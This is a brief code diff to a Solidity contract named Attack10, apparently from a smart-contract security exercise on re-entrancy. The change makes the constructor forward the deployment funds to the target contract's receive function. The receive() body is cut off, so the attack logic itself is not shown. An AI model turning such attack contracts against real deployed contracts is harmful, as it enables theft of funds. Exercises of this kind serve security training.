@@ -4,10 +4,9 @@ pragma solidity ^0.6.12;
 import "./10-re-entrancy.sol";
 
 contract Attack10 {
-    // constructor sets the address of the Reentrancy contract to attack
     constructor(address _reEntrancyAddress) public payable {
-        // #ToDo
-        // need to fund Reentrance, by call donate upon deployment
+        // upon deployment send funds to Reentrance receive()
+        address(_reEntrancyAddress).call{value: msg.value}("");
     }
 
     receive() external payable {
